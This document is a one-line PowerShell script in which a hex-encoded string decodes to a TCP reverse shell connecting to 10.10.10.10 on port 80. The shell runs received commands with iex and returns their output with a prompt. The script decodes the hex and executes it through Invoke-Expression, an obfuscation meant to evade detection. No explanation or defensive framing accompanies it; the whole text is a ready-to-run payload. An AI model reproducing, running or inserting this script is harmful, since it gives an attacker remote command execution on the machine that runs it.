$hxB= '24 63 6C 69 65 6E 74 20 3D 20 4E 65 77 2D 4F 62 6A 65 63 74 20 53 79 73 74 65 6D 2E 4E 65 74 2E 53 6F 63 6B 65 74 73 2E 54 43 50 43 6C 69 65 6E 74 28 22 31 30 2E 31 30 2E 31 30 2E 31 30 22 2C 38 30 29 3B 24 73 74 72 65 61 6D 20 3D 20 24 63 6C 69 65 6E 74 2E 47 65 74 53 74 72 65 61 6D 28 29 3B 5B 62 79 74 65 5B 5D 5D 24 62 79 74 65 73 20 3D 20 30 2E 2E 36 35 35 33 35 7C 25 7B 30 7D 3B 77 68 69 6C 65 28 28 24 69 20 3D 20 24 73 74 72 65 61 6D 2E 52 65 61 64 28 24 62 79 74 65 73 2C 20 30 2C 20 24 62 79 74 65 73 2E 4C 65 6E 67 74 68 29 29 20 2D 6E 65 20 30 29 7B 3B 24 64 61 74 61 20 3D 20 28 4E 65 77 2D 4F 62 6A 65 63 74 20 2D 54 79 70 65 4E 61 6D 65 20 53 79 73 74 65 6D 2E 54 65 78 74 2E 41 53 43 49 49 45 6E 63 6F 64 69 6E 67 29 2E 47 65 74 53 74 72 69 6E 67 28 24 62 79 74 65 73 2C 30 2C 20 24 69 29 3B 24 73 65 6E 64 62 61 63 6B 20 3D 20 28 69 65 78 20 24 64 61 74 61 20 32 3E 26 31 20 7C 20 4F 75 74 2D 53 74 72 69 6E 67 20 29 3B 24 73 65 6E 64 62 61 63 6B 32 20 3D 20 24 73 65 6E 64 62 61 63 6B 20 2B 20 22 50 53 20 22 20 2B 20 28 70 77 64 29 2E 50 61 74 68 20 2B 20 22 3E 20 22 3B 24 73 65 6E 64 62 79 74 65 20 3D 20 28 5B 74 65 78 74 2E 65 6E 63 6F 64 69 6E 67 5D 3A 3A 41 53 43 49 49 29 2E 47 65 74 42 79 74 65 73 28 24 73 65 6E 64 62 61 63 6B 32 29 3B 24 73 74 72 65 61 6D 2E 57 72 69 74 65 28 24 73 65 6E 64 62 79 74 65 2C 30 2C 24 73 65 6E 64 62 79 74 65 2E 4C 65 6E 67 74 68 29 3B 24 73 74 72 65 61 6D 2E 46 6C 75 73 68 28 29 7D 3B 24 63 6C 69 65 6E 74 2E 43 6C 6F 73 65 28 29';$hxB.Split(" ") | forEach {[char]([convert]::toint16($_,16))} | forEach {$rs = $rs + $_};Invoke-expression $rs